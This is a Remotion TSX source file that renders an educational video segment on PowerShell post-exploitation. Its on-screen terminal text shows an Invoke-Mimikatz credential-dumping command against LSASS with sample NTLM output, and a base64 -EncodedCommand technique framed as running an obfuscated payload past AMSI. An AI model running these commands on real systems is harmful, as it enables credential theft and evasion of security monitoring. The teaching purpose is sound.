// ── video/remotion/compositions/Ps05CredentialsObfuscationEn.tsx ─
// English version of ps-05-credentials-obfuscation. Same visuals; beats
// re-measured against the EN wavs (word-level transcription, 2026-08-30).

import React from 'react';
import { AbsoluteFill, Sequence, staticFile, useVideoConfig } from 'remotion';
import { Audio } from '@remotion/media';
import { sceneStartFrames, AUDIO_TIMINGS_EN, audioBase } from '../audioTimings';
import { THEME, MONO } from '../theme';
import { FontFace } from '../fonts';
import { RevealLine } from '../primitives/RevealLine';
import { KeyCapsule } from '../primitives/KeyCapsule';
import { TerminalWindow } from '../primitives/TerminalWindow';

const CENTERED: React.CSSProperties = {
  display: 'flex',
  flexDirection: 'column',
  justifyContent: 'center',
  alignItems: 'center',
  height: '100%',
  textAlign: 'center',
};

// ── Scene 1: the post-exploitation favorite ───────────────
// EN: one reason 3.4 · memory 6.5 · most watched 9.4 · LSASS 13.2 ·
// loot waiting 16.0.
const Scene1: React.FC<{ fps: number }> = ({ fps }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 32, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 18 }}>
      CREDENTIALS AND <span style={{ color: THEME.red }}>OBFUSCATION</span>
    </div>
    <div style={{ fontSize: 18, color: THEME.muted, fontFamily: MONO, marginBottom: 28 }}>
      memory, credentials, the network — and the most watched
    </div>
    <KeyCapsule label="credentials in RAM" value="live inside the LSASS process" accent={THEME.cyan} delay={Math.round(13.2 * fps)} size={24} />
    <div style={{ marginTop: 24, fontSize: 17, color: THEME.muted, fontFamily: MONO, textAlign: 'left', width: 780 }}>
      <RevealLine at={4.3} fps={fps} mark="▸" color={THEME.cyan}>it touches everything that needs touching — but it's also the most watched</RevealLine>
      <div style={{ height: 10 }} />
      <RevealLine at={16.0} fps={fps} mark="▸" color={THEME.green}>a session's credentials are loot waiting for someone to grab it</RevealLine>
    </div>
  </AbsoluteFill>
);

// ── Scene 2: LSASS + Mimikatz + Rubeus ──────────────────
// EN: LSASS 1.5 · Mimikatz 3.5 · invoke Mimikatz 5.5 · dump 7.0 ·
/// clear text 8.3 · Kerberos 9.6 · catch fast 13.0 · variants 15.9 ·
// gold 19.9.
const Scene2: React.FC<{ fps: number }> = ({ fps }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 26, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 16 }}>
      <span style={{ color: THEME.red }}>LSASS.EXE</span>: CREDENTIAL EXTRACTION
    </div>
    <TerminalWindow title="PS C:\> Invoke-Mimikatz" width={940} delay={Math.round(3.0 * fps)}>
      <div style={{ fontSize: 13, whiteSpace: 'pre', lineHeight: 1.65 }}>
        <span style={{ color: THEME.cyan }}>Invoke-Mimikatz</span><span style={{ color: THEME.text }}> -Command </span><span style={{ color: THEME.green }}>'"sekurlsa::logonpasswords"'</span>
        {'\n'}<span style={{ color: THEME.dim }}># Dumps passwords in clear text, NTLM hashes and Kerberos tickets:</span>
        {'\n'}<span style={{ color: THEME.amber }}>Authentication Id : 0 ; 1234567</span>
        {'\n'}<span style={{ color: THEME.text }}>User Name         : Administrator</span>
        {'\n'}<span style={{ color: THEME.green }}>* NTLM            : 8846f7eaee8fb117ad06bdd830b7586c</span>
        {'\n'}<span style={{ color: THEME.dim }}>{`# AVs/EDRs catch Mimikatz fast -> modern attacks use variants like Rubeus`}</span>
      </div>
    </TerminalWindow>
    <div style={{ display: 'flex', gap: 12, marginTop: 18 }}>
      <KeyCapsule label="LSASS.exe" value="session memory" accent={THEME.red} delay={Math.round(1.5 * fps)} size={16} />
      <KeyCapsule label="Invoke-Mimikatz" value="NTLM hashes / Kerberos" accent={THEME.amber} delay={Math.round(5.5 * fps)} size={16} />
      <KeyCapsule label="Rubeus / EDR" value="modern variants" accent={THEME.cyan} delay={Math.round(14.8 * fps)} size={16} />
    </div>
    <div style={{ marginTop: 14, fontSize: 15, color: THEME.muted, fontFamily: MONO }}>
      <RevealLine at={19.5} fps={fps} mark="▸" color={THEME.amber}>the concept doesn't change: a session's memory is gold</RevealLine>
    </div>
  </AbsoluteFill>
);

// ── Scene 3: AMSI + base64 obfuscation ──────────────────
// EN: AMSI 3.1 · obfuscate 7.6 · base 64 9.1 · strings apart 11.1 ·
// cmdlet names 12.6 · dash encoded command 16.6 · script block
// logging 19.0 · unmanaged tools 23.7.
const Scene3: React.FC<{ fps: number }> = ({ fps }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 26, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 16 }}>
      OBFUSCATION: <span style={{ color: THEME.green }}>AMSI AND -EncodedCommand</span>
    </div>
    <TerminalWindow title="PS C:\> powershell -EncodedCommand $enc" width={960} delay={Math.round(14.2 * fps)}>
      <div style={{ fontSize: 13, whiteSpace: 'pre', lineHeight: 1.65 }}>
        <span style={{ color: THEME.text }}>$cmd = "whoami /priv"</span>
        {'\n'}<span style={{ color: THEME.text }}>$bytes = [Text.Encoding]::Unicode.GetBytes($cmd)</span>
        {'\n'}<span style={{ color: THEME.text }}>$enc = [Convert]::ToBase64String($bytes) </span><span style={{ color: THEME.dim }}># Base64 UTF-16LE</span>
        {'\n'}<span style={{ color: THEME.dim }}># Run the obfuscated payload on the target:</span>
        {'\n'}<span style={{ color: THEME.cyan }}>powershell -NoProfile -EncodedCommand $enc</span>
        {'\n'}<span style={{ color: THEME.amber }}>SeDebugPrivilege            Enabled</span>
      </div>
    </TerminalWindow>
    <div style={{ display: 'flex', gap: 12, marginTop: 18 }}>
      <KeyCapsule label="AMSI" value="scans every script" accent={THEME.red} delay={Math.round(3.1 * fps)} size={16} />
      <KeyCapsule label="-EncodedCommand" value="base64 unicode" accent={THEME.green} delay={Math.round(14.9 * fps)} size={16} />
      <KeyCapsule label="ScriptBlock Logging" value="defenders strike back" accent={THEME.amber} delay={Math.round(17.5 * fps)} size={16} />
    </div>
    <div style={{ marginTop: 14, fontSize: 15, color: THEME.muted, fontFamily: MONO }}>
      <RevealLine at={22.2} fps={fps} mark="▸" color={THEME.cyan}>that's why silent attackers use unmanaged tools</RevealLine>
    </div>
  </AbsoluteFill>
);

export const Ps05CredentialsObfuscationEn: React.FC = () => {
  const { fps } = useVideoConfig();
  const [s1, s2, s3] = AUDIO_TIMINGS_EN['ps-05-credentials-obfuscation'];
  const starts = sceneStartFrames('ps-05-credentials-obfuscation', fps, 'en');
  const dur1 = Math.ceil(s1 * fps);
  const dur2 = Math.ceil(s2 * fps);
  const dur3 = Math.ceil(s3 * fps) + fps;
  const base = audioBase('en');

  return (
    <AbsoluteFill style={{ background: THEME.bg, padding: 60, fontFamily: MONO }}>
      <FontFace />
      <Sequence from={starts[0]} durationInFrames={dur1}>
        <Audio src={staticFile(`${base}/ps-05-credentials-obfuscation/ps-05-scene1.wav`)} />
        <Scene1 fps={fps} />
      </Sequence>
      <Sequence from={starts[1]} durationInFrames={dur2}>
        <Audio src={staticFile(`${base}/ps-05-credentials-obfuscation/ps-05-scene2.wav`)} />
        <Scene2 fps={fps} />
      </Sequence>
      <Sequence from={starts[2]} durationInFrames={dur3}>
        <Audio src={staticFile(`${base}/ps-05-credentials-obfuscation/ps-05-scene3.wav`)} />
        <Scene3 fps={fps} />
      </Sequence>
    </AbsoluteFill>
  );
};
